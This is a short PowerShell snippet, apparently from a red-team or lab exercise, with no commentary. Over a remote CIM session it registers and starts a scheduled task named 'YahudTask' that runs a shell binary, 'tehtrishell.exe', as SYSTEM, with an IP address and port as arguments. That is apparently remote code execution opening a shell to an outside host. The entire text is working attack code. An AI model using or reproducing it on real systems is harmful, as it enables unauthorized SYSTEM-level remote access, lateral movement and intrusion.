$binary = "C:\Windows\tehtrishell.exe"
$argument = "192.168.1.110 2936"
$action = New-ScheduledTaskAction -CimSession $session -Execute $binary -Argument $argument
Register-ScheduledTask -CimSession $session -Action $action -User "NT AUTHORITY\SYSTEM" -TaskName "YahudTask"
Start-ScheduledTask -CimSession $session -TaskName "YahudTask"